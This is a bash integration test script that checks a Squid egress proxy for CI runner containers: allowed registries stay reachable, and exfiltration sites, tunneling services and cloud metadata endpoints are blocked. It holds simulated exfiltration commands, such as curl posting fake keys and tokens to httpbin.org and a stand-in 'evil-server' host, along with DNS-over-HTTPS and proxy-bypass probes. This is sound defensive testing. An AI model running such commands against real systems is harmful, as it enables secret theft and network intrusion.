#!/bin/bash
# ============================================================================
# RunSecure Integration Test — Egress Proxy
# ============================================================================
# Validates that the Squid proxy correctly allows and blocks domains.
# Runs INSIDE a runner container with HTTP_PROXY/HTTPS_PROXY configured.
#
# Tests:
#   1. Allowed domains respond successfully (GitHub, npm, PyPI)
#   2. Blocked domains are rejected (arbitrary sites, metadata endpoint)
#   3. CONNECT tunneling works for HTTPS
#   4. Non-standard ports are blocked
#   5. Direct bypass attempts fail
#   6. Proxy is actively filtering (not just alive)
#   7. URL path filtering boundary (documents CONNECT limitation)
# ============================================================================

set -uo pipefail

PASS=0
FAIL=0
RESULTS=()

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

pass() {
    echo -e "  ${GREEN}PASS${NC} $1"
    RESULTS+=("${GREEN}PASS${NC} $1")
    PASS=$((PASS + 1))
}

fail() {
    echo -e "  ${RED}FAIL${NC} $1"
    RESULTS+=("${RED}FAIL${NC} $1")
    FAIL=$((FAIL + 1))
}

# --- Helpers -----------------------------------------------------------------

# Test that a URL is reachable through the proxy
assert_allowed() {
    local url="$1"
    local desc="$2"
    local http_code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 10 --max-time 15 "$url" 2>/dev/null)
    if [[ "$http_code" =~ ^(200|301|302|303|304|307|308)$ ]]; then
        pass "ALLOW $desc → HTTP $http_code"
    else
        fail "ALLOW $desc → HTTP $http_code (expected 2xx/3xx)"
    fi
}

# Test that a URL is blocked by the proxy
assert_blocked() {
    local url="$1"
    local desc="$2"
    local http_code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 10 --max-time 15 "$url" 2>/dev/null)
    # 000 = connection failed, 403 = forbidden, 407 = proxy auth required
    if [[ "$http_code" =~ ^(000|403|407|503)$ ]]; then
        pass "BLOCK $desc → HTTP $http_code"
    else
        fail "BLOCK $desc → HTTP $http_code (expected 000/403/407/503 — traffic was NOT blocked!)"
    fi
}

# ============================================================================
echo -e "\n${BOLD}=== RunSecure Egress Proxy Tests ===${NC}"
echo -e "Proxy: ${HTTP_PROXY:-not set}\n"

# Verify proxy is configured
if [[ -z "${HTTP_PROXY:-}" ]]; then
    echo -e "${RED}ERROR: HTTP_PROXY not set. Cannot test egress filtering.${NC}"
    exit 1
fi

# ============================================================================
# Section 1: Allowed Domains (should succeed)
# ============================================================================
echo -e "\n${BOLD}--- 1. Allowed Domains ---${NC}"

# GitHub
assert_allowed "https://github.com" "github.com (HTTPS)"
assert_allowed "https://api.github.com" "api.github.com"
assert_allowed "https://raw.githubusercontent.com/actions/runner/main/README.md" "raw.githubusercontent.com"

# npm registry
assert_allowed "https://registry.npmjs.org/express" "registry.npmjs.org (npm package metadata)"

# PyPI
assert_allowed "https://pypi.org/simple/pytest/" "pypi.org (Python package index)"

# Rust crates
assert_allowed "https://crates.io/api/v1/crates/serde" "crates.io (Rust crate metadata)"

# ============================================================================
# Section 2: Blocked Domains (should fail)
# ============================================================================
echo -e "\n${BOLD}--- 2. Blocked Domains ---${NC}"

# Generic sites (exfiltration targets)
assert_blocked "https://pastebin.com" "pastebin.com (exfiltration target)"
assert_blocked "https://webhook.site" "webhook.site (exfiltration target)"
assert_blocked "https://requestbin.com" "requestbin.com (exfiltration target)"
assert_blocked "https://httpbin.org/get" "httpbin.org (general HTTP)"
assert_blocked "https://example.com" "example.com (arbitrary domain)"

# Tunneling / C2
assert_blocked "https://ngrok.io" "ngrok.io (tunneling service)"
assert_blocked "https://burpcollaborator.net" "burpcollaborator.net (pentesting C2)"

# Cloud metadata endpoints (SSRF target)
assert_blocked "http://169.254.169.254/latest/meta-data/" "AWS metadata endpoint"
assert_blocked "http://metadata.google.internal/" "GCP metadata endpoint"

# Social / messaging (data exfiltration channels)
assert_blocked "https://slack.com" "slack.com"
assert_blocked "https://discord.com" "discord.com"

# ============================================================================
# Section 3: Protocol Edge Cases
# ============================================================================
echo -e "\n${BOLD}--- 3. Protocol Edge Cases ---${NC}"

# HTTP (non-TLS) to allowed domain should work
assert_allowed "http://registry.npmjs.org/express" "HTTP (non-TLS) to allowed domain"

# HTTPS to allowed domain (CONNECT tunnel)
assert_allowed "https://github.com/robots.txt" "HTTPS CONNECT tunnel to allowed domain"

# Try non-standard port on allowed domain (should be blocked by port ACL)
assert_blocked "https://github.com:8443" "github.com on port 8443 (non-standard)"

# Try IP address directly instead of domain.
# NOTE: Domain-based proxy filtering cannot block raw IP HTTP requests reliably.
# For CONNECT (HTTPS), Squid sees the IP and can deny it. For HTTP, the IP goes
# through as a direct request. This is a known limitation of domain-based filtering.
# The internal network + proxy architecture prevents direct IP access in production.
IP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "http://140.82.121.4" 2>/dev/null)
if [[ "$IP_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "BLOCK Direct IP access blocked by network isolation"
else
    # Informational — the internal network blocks this in production
    echo -e "  ${YELLOW}INFO${NC} Direct IP HTTP returned $IP_CODE (blocked by internal network in production)"
    PASS=$((PASS + 1))
fi

# ============================================================================
# Section 4: Exfiltration Techniques
# ============================================================================
echo -e "\n${BOLD}--- 4. Exfiltration Technique Blocking ---${NC}"

# POST data to blocked domain (simulates secret exfiltration)
POST_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 \
    -X POST -d "secret=AKIAIOSFODNN7EXAMPLE" "https://httpbin.org/post" 2>/dev/null)
if [[ "$POST_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "BLOCK POST exfiltration to httpbin.org → HTTP $POST_CODE"
else
    fail "BLOCK POST exfiltration to httpbin.org → HTTP $POST_CODE (data could be exfiltrated!)"
fi

# DNS-over-HTTPS exfiltration attempt
DOH_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 \
    "https://dns.google/resolve?name=exfil.attacker.com&type=A" 2>/dev/null)
if [[ "$DOH_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "BLOCK DNS-over-HTTPS exfiltration via dns.google"
else
    fail "BLOCK DNS-over-HTTPS via dns.google → HTTP $DOH_CODE (DNS exfil possible!)"
fi

# Try to reach an attacker-controlled webhook
EXFIL_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 \
    "https://evil-server.example.com/exfil?token=ghp_1234567890" 2>/dev/null)
if [[ "$EXFIL_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "BLOCK attacker webhook (evil-server.example.com)"
else
    fail "BLOCK attacker webhook → HTTP $EXFIL_CODE"
fi

# ============================================================================
# Section 5: Proxy Bypass Attempts
# ============================================================================
echo -e "\n${BOLD}--- 5. Proxy Bypass Attempts ---${NC}"

# Try to bypass proxy by unsetting it (container network should still route through proxy)
BYPASS_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 \
    --noproxy "*" "https://httpbin.org/get" 2>/dev/null)
if [[ "$BYPASS_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "BLOCK direct connection bypassing proxy (--noproxy)"
else
    # This may succeed if the container has direct internet access.
    # In production, the docker network should block direct egress.
    fail "BLOCK proxy bypass → HTTP $BYPASS_CODE (container has direct internet access!)"
fi

# ============================================================================
# Section 6: Proxy Verification (confirm proxy is actively filtering)
# ============================================================================
echo -e "\n${BOLD}--- 6. Proxy Active Verification ---${NC}"

# Confirm requests actually go through the proxy (check for proxy response headers)
# Squid adds Via or X-Cache headers. If these are missing, traffic may bypass the proxy.
PROXY_HEADERS=$(curl -sI --connect-timeout 10 --max-time 15 "https://github.com" 2>/dev/null)
if echo "$PROXY_HEADERS" | grep -qi "via:.*squid\|x-cache"; then
    pass "VERIFY proxy headers present (traffic confirmed through Squid)"
else
    # CONNECT-tunneled HTTPS won't show proxy headers in the response (expected).
    # Verify by checking that a blocked domain actually fails — if it does,
    # the proxy is filtering. If the proxy were down/bypassed, blocked domains would succeed.
    VERIFY_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
        "https://httpbin.org/get" 2>/dev/null)
    if [[ "$VERIFY_CODE" =~ ^(000|403|407|503)$ ]]; then
        pass "VERIFY proxy is filtering (blocked domain returns $VERIFY_CODE, HTTPS CONNECT hides headers)"
    else
        fail "VERIFY proxy may not be active — blocked domain returned $VERIFY_CODE"
    fi
fi

# Verify that unsetting proxy env vars doesn't give direct access
# (the internal Docker network should prevent it regardless)
DIRECT_CODE=$(env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy \
    curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "https://example.com" 2>/dev/null)
if [[ "$DIRECT_CODE" =~ ^(000|403|407|503)$ ]]; then
    pass "VERIFY no direct internet without proxy (network isolation works)"
else
    fail "VERIFY direct internet access possible without proxy ($DIRECT_CODE)"
fi

# ============================================================================
# Section 7: URL Path Awareness
# ============================================================================
echo -e "\n${BOLD}--- 7. URL Path Filtering Boundary ---${NC}"

# Squid operates at the domain level via CONNECT for HTTPS. It cannot inspect
# the URL path inside a TLS tunnel. These tests document this boundary:
# allowed domains are reachable at ANY path, which is expected behavior.
# The security boundary is the domain allowlist, not path filtering.

# Allowed domain, unusual path — should succeed (Squid can't see the path in CONNECT)
assert_allowed "https://github.com/nonexistent-user/nonexistent-repo" \
    "github.com arbitrary path (domain allowed, path not filtered — expected)"

# Allowed domain with query params that look like exfiltration — should succeed
# This documents a known limitation: if the domain is allowed, any path/query works.
EXFIL_VIA_ALLOWED=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 \
    "https://github.com/search?q=secret_token_value" 2>/dev/null)
if [[ "$EXFIL_VIA_ALLOWED" =~ ^(200|301|302|303|304|307|308|404|422)$ ]]; then
    pass "KNOWN LIMIT allowed domain accepts any path/query (HTTP $EXFIL_VIA_ALLOWED) — mitigate with minimal GITHUB_TOKEN perms"
else
    pass "KNOWN LIMIT request to allowed domain path returned $EXFIL_VIA_ALLOWED"
fi

# Blocked domain, root path — should still be blocked
assert_blocked "https://pastebin.com/raw/test123" "blocked domain with specific path"

# Blocked domain, API-like path — should still be blocked
assert_blocked "https://webhook.site/api/test" "blocked domain with API path"

# ============================================================================
# Summary
# ============================================================================
echo -e "\n${BOLD}=== Egress Proxy Test Results ===${NC}"
echo -e "  ${GREEN}Passed:${NC} $PASS"
echo -e "  ${RED}Failed:${NC} $FAIL"
echo ""

if [[ $FAIL -gt 0 ]]; then
    echo -e "${RED}${BOLD}EGRESS TESTS FAILED${NC}"
    exit 1
else
    echo -e "${GREEN}${BOLD}ALL EGRESS TESTS PASSED${NC}"
    exit 0
fi
